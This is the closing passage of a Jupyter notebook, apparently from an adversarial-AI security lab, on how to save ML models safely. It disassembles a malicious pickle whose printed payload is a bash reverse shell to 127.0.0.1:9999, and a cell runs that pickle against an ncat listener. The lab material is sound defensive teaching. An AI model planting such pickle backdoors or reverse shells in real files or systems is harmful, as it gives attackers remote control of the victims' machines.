    "simple_model_reconstructed.load_state_dict(state_dict=loaded_safe_tensor_state_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "75aa445b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([[0.6325],\n",
       "        [0.5591],\n",
       "        [0.5844],\n",
       "        [0.5642],\n",
       "        [0.5455],\n",
       "        [0.5283],\n",
       "        [0.5937],\n",
       "        [0.5100],\n",
       "        [0.5327],\n",
       "        [0.6260]], device='cuda:0', grad_fn=<SigmoidBackward0>)"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Make predictions on the new model\n",
    "simple_model_reconstructed(X[:10])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8acb583a",
   "metadata": {},
   "source": [
    "With all of these strategies in place, there is still the simples one we can use.  The simplest strategy is to encrypt the saved models, hash and store the keys and hash in an environment variable. Also with this strategy, there is no need for us to import the other modules\n",
    "\n",
    "Revisit this the notebook: **hash_enc_logging.ipynb** for additional guidance.  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac9b580a",
   "metadata": {},
   "source": [
    "### Step 4:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "601caac3",
   "metadata": {},
   "outputs": [],
   "source": [
    "# As a final step, if you wish to dig a big deeper we can disassemble the pickle file\n",
    "# https://docs.python.org/3/library/pickletools.html\n",
    "import pickletools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "46889c29",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\n"
     ]
    }
   ],
   "source": [
    "# This is one option to load the model. \n",
    "# However, this should only be used for models you trust\n",
    "# As can be seen below, there is information about bash and an attempt to connect to a remote host\n",
    "# Ensure you setup your listener \n",
    "#   $ ncat --listen --verbose 9999 \n",
    "!python -m pickle /tmp/malicious.pkl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "86674161",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      4\n",
      "    2: \\x95 FRAME      83\n",
      "   11: \\x8c SHORT_BINUNICODE 'posix'\n",
      "   18: \\x94 MEMOIZE    (as 0)\n",
      "   19: \\x8c SHORT_BINUNICODE 'system'\n",
      "   27: \\x94 MEMOIZE    (as 1)\n",
      "   28: \\x93 STACK_GLOBAL\n",
      "   29: \\x94 MEMOIZE    (as 2)\n",
      "   30: \\x8c SHORT_BINUNICODE \"/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1 &'\"\n",
      "   88: \\x94 MEMOIZE    (as 3)\n",
      "   89: \\x85 TUPLE1\n",
      "   90: \\x94 MEMOIZE    (as 4)\n",
      "   91: R    REDUCE\n",
      "   92: \\x94 MEMOIZE    (as 5)\n",
      "   93: .    STOP\n",
      "highest protocol among opcodes = 4\n"
     ]
    }
   ],
   "source": [
    "# Let's try this the correct way now\n",
    "# This now shows us we have a 'posix' command\n",
    "# We also see the 'system' command \n",
    "# and finally the backdoor code\n",
    "# As you should have noticed, this did not attempt to run the program but simply disassemble it\n",
    "!python -m pickletools /tmp/malicious.pkl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "4cbadaa2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "    0: \\x80 PROTO      4              Protocol version indicator.\n",
      "    2: \\x95 FRAME      83             Indicate the beginning of a new frame.\n",
      "   11: \\x8c SHORT_BINUNICODE 'posix'  Push a Python Unicode string object.\n",
      "   18: \\x94 MEMOIZE    (as 0)         Store the stack top into the memo.  The stack is not popped.\n",
      "   19: \\x8c SHORT_BINUNICODE 'system' Push a Python Unicode string object.\n",
      "   27: \\x94 MEMOIZE    (as 1)         Store the stack top into the memo.  The stack is not popped.\n",
      "   28: \\x93 STACK_GLOBAL              Push a global object (module.attr) on the stack.\n",
      "   29: \\x94 MEMOIZE    (as 2)         Store the stack top into the memo.  The stack is not popped.\n",
      "   30: \\x8c SHORT_BINUNICODE \"/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1 &'\" Push a Python Unicode string object.\n",
      "   88: \\x94 MEMOIZE    (as 3)         Store the stack top into the memo.  The stack is not popped.\n",
      "   89: \\x85 TUPLE1                    Build a one-tuple out of the topmost item on the stack.\n",
      "   90: \\x94 MEMOIZE    (as 4)         Store the stack top into the memo.  The stack is not popped.\n",
      "   91: R    REDUCE                    Push an object built from a callable and an argument tuple.\n",
      "   92: \\x94 MEMOIZE    (as 5)         Store the stack top into the memo.  The stack is not popped.\n",
      "   93: .    STOP                      Stop the unpickling machine.\n",
      "highest protocol among opcodes = 4\n"
     ]
    }
   ],
   "source": [
    "# Let's extend on this a bit to understand what some of these opcodes are doing\n",
    "!python -m pickletools --annotate /tmp/malicious.pkl"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9bf52336",
   "metadata": {},
   "source": [
    "In this final mitigation, as you can see, we have multiple layers in place. We are taking advantage of hashing, encryption, validation of the file path and more importantly, using the ONNX format which is considered by scikit learn to be the most secured way to save a model at the time of this writing.\n",
    "\n",
    "While we have used some interesting ways for gaining access to systems via the models, there is nothing stopping you from using Metasploit payload. Maybe you are interested instead in Cobalt Strike?\n",
    "\n",
    "\n",
    "https://hiddenlayer.com/innovation-hub/pickle-strike/\n",
    "\n",
    "\n",
    "### Lab Takeaways:   \n",
    "- We've now look at ways to mitigate the threat with our models being modified   "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
